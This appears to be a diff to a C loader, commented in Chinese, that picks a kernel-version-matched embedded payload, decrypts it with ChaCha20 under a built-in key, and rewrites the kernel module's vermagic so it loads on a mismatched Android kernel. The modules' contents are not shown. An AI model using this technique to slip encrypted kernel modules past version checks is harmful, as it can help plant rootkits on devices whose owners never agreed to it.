@@ -83,16 +83,18 @@ static unsigned char *b64_decode(const char *in, size_t inlen, size_t *outlen)
 	return out;
 }
 
-/* ---- 当前内核版本段 ---- */
-static int current_kver(char *buf, size_t cap)
+/* ---- 当前内核 release (含 -android 后缀) ---- */
+static int current_release(char *buf, size_t cap)
 {
 	FILE *f;
 	const char *force = getenv("WIND_KVER_FORCE");
+	char line[512];
+	char *p, *e;
+	size_t n;
 
 	/* 只给测试/CI 用: 沙箱里读不到 /proc/version 时手动指定 */
 	if (force && force[0]) {
-		size_t n = strlen(force);
-
+		n = strlen(force);
 		if (n == 0 || n >= cap)
 			return -1;
 		memcpy(buf, force, n);
@@ -101,10 +103,6 @@ static int current_kver(char *buf, size_t cap)
 	}
 
 	f = fopen("/proc/version", "r");
-	char line[512];
-	char *p, *d;
-	size_t n;
-
 	if (!f)
 		return -1;
 	if (!fgets(line, (int)sizeof(line), f)) {
@@ -118,10 +116,8 @@ static int current_kver(char *buf, size_t cap)
 	if (!p)
 		return -1;
 	p += 8;
-	d = strchr(p, '-');
-	if (!d)
-		d = strchr(p, ' ');
-	n = d ? (size_t)(d - p) : strlen(p);
+	e = strchr(p, ' ');
+	n = e ? (size_t)(e - p) : strlen(p);
 	if (n == 0 || n >= cap)
 		return -1;
 	memcpy(buf, p, n);
@@ -129,26 +125,150 @@ static int current_kver(char *buf, size_t cap)
 	return 0;
 }
 
-/* kver "6.6.118" 与 payload kver 比较:
- * 完全相等, 或 payload 写的更短且是前缀 (6.6 对 6.6.118) */
-static int kver_match(const char *want, const char *have)
+/* "6.6.118-android15-8" -> "6.6";  "5.10.198" -> "5.10" */
+static int major_minor(const char *in, char *out, size_t cap)
 {
-	size_t n;
+	size_t i = 0;
+	int dots = 0;
 
-	if (!want || !have)
+	if (!in || !in[0])
+		return -1;
+	while (in[i] && dots < 2) {
+		if (in[i] == '.') {
+			dots++;
+			if (dots == 2)
+				break;
+		} else if (in[i] < '0' || in[i] > '9') {
+			return -1;
+		}
+		i++;
+	}
+	if (dots < 2 || i == 0 || i >= cap)
+		return -1;
+	memcpy(out, in, i);
+	out[i] = 0;
+	return 0;
+}
+
+/* "6.6.118" -> 118; 解析不到返回 -1 */
+static long patch_level(const char *in)
+{
+	long v = 0;
+	int seg = 0;
+
+	if (!in)
+		return -1;
+	while (*in) {
+		if (*in == '.') {
+			if (++seg == 2) {
+				while (*in >= '0' && *in <= '9') {
+					v = v * 10 + (*in - '0');
+					in++;
+				}
+				return v;
+			}
+			v = 0;
+			in++;
+			continue;
+		}
+		if (*in < '0' || *in > '9')
+			return -1;
+		in++;
+	}
+	return -1;
+}
+
+/* 优先级: 全等 > 主次版本相同 (6.6.118 吃 6.6.66), 同类取 patch 最大的 */
+static const struct wind_payload *pick_payload(const char *release)
+{
+	char want[32];
+	const struct wind_payload *exact = NULL;
+	const struct wind_payload *loose = NULL;
+	long loose_patch = -1;
+	int i;
+
+	if (major_minor(release, want, sizeof(want)) != 0)
+		return NULL;
+
+	for (i = 0; i < wind_payload_cnt; i++) {
+		char have[32];
+		const struct wind_payload *p = &wind_payloads[i];
+
+		if (!p->kver)
+			continue;
+
+		/* 全等: payload 的 kver 就是当前版本段 */
+		if (!strcmp(p->kver, release)) {
+			exact = p;
+			continue;
+		}
+		if (strncmp(p->kver, release, strlen(p->kver)) == 0 &&
+		    release[strlen(p->kver)] == 0) {
+			exact = p;
+			continue;
+		}
+
+		if (major_minor(p->kver, have, sizeof(have)) != 0)
+			continue;
+		if (strcmp(have, want) != 0)
+			continue;
+
+		{
+			long pl = patch_level(p->kver);
+
+			if (pl > loose_patch) {
+				loose_patch = pl;
+				loose = p;
+			}
+		}
+	}
+	return exact ? exact : loose;
+}
+
+/* 把 ko 里的 vermagic 版本段改成当前内核的。
+ * 只在长度完全一致时才动 —— .modinfo 是定长字符串, 改长度会踩坏后面。 */
+static int patch_vermagic(unsigned char *buf, size_t len, const char *release)
+{
+	const char *tag = "vermagic=";
+	unsigned char *p, *val;
+	size_t taglen = strlen(tag);
+	size_t toklen;
+	size_t i;
+
+	p = memmem(buf, len, tag, taglen);
+	if (!p)
+		return -1;
+	val = p + taglen;
+
+	/* 版本段 = 到空格或 NUL 为止 */
+	toklen = 0;
+	while (val + toklen < buf + len && val[toklen] != ' ' && val[toklen] != 0)
+		toklen++;
+
+	if (toklen == strlen(release) && !memcmp(val, release, toklen))
+		return 0;               /* 已经一致 */
+
+	if (toklen != strlen(release)) {
+		fprintf(stderr,
+			"[!] vermagic 版本段长度不同, 没法原地改\n"
+			"    载荷 %zu 字节 [%.*s]\n"
+			"    本机 %zu 字节 [%s]\n"
+			"    insmod 会报 version magic 不匹配, 换对应内核版本的 ko\n",
+			toklen, (int)toklen, (char *)val,
+			strlen(release), release);
 		return 0;
-	n = strlen(want);
-	if (!n)
-		return 0;
-	if (strncmp(want, have, n) != 0)
-		return 0;
-	return have[n] == 0 || have[n] == '.';
+	}
+
+	for (i = 0; i < toklen; i++)
+		val[i] = (unsigned char)release[i];
+	printf("[*] vermagic 已改写为本机 [%s]\n", release);
+	return 1;
 }
 
 int wind_payload_extract(const char *dest)
 {
-	char kver[64];
-	const struct wind_payload *hit = NULL;
+	char release[128];
+	const struct wind_payload *hit;
 	unsigned char key[32];
 	unsigned char *plain = NULL;
 	size_t plainlen = 0;
@@ -158,21 +278,24 @@ int wind_payload_extract(const char *dest)
 	if (wind_payload_cnt <= 0)
 		return WPE_NO_PAYLOAD;
 
-	if (current_kver(kver, sizeof(kver)) != 0)
+	if (current_release(release, sizeof(release)) != 0)
 		return WPE_NO_MATCH;
 
-	for (i = 0; i < wind_payload_cnt; i++) {
-		if (kver_match(wind_payloads[i].kver, kver)) {
-			hit = &wind_payloads[i];
-			break;
-		}
-	}
+	hit = pick_payload(release);
 	if (!hit) {
-		fprintf(stderr, "[x] 内嵌载荷没有匹配 %s 的, 有:\n", kver);
+		char want[32];
+
+		if (major_minor(release, want, sizeof(want)) != 0)
+			snprintf(want, sizeof(want), "?");
+		fprintf(stderr, "[x] 内嵌载荷没有 %s 的, 有:\n", want);
 		for (i = 0; i < wind_payload_cnt; i++)
 			fprintf(stderr, "      %s\n", wind_payloads[i].kver);
 		return WPE_NO_MATCH;
 	}
+
+	if (strcmp(hit->kver, release) != 0)
+		printf("[*] 主次版本匹配: 本机 %s -> 用载荷 %s\n",
+		       release, hit->kver);
 
 	plain = b64_decode(hit->b64, strlen(hit->b64), &plainlen);
 	if (!plain)
@@ -187,6 +310,8 @@ int wind_payload_extract(const char *dest)
 	key_build(key);
 	chacha20_xor(plain, plainlen, key, hit->nonce);
 	memset(key, 0, sizeof(key));
+
+	patch_vermagic(plain, plainlen, release);
 
 	fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC, 0755);
 	if (fd < 0) {
